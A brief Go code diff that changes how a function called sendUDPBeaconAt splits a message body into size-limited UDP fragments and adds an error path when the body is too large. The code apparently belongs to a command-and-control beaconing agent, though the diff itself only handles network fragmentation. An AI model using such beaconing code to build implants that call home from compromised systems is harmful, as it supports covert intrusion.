@@ -48,7 +48,14 @@ func sendUDPBeaconAt(hostPort string, body []byte) []byte {
 	if err := conn.SetDeadline(time.Now().Add(15 * time.Second)); err != nil {
 		return nil
 	}
-	for _, frag := range protocol.DatagramFragSplit(body) {
+	frags := protocol.DatagramFragSplitWithSize(body, udpFragmentPayload(snapshotLink()))
+	if len(frags) == 0 {
+		if Debug {
+			fmt.Println("[!] UDP beacon: body too large for the fragment framing")
+		}
+		return nil
+	}
+	for _, frag := range frags {
 		if _, err := conn.Write(frag); err != nil {
 			if Debug {
 				fmt.Printf("[!] UDP beacon: write failed: %v\n", err)
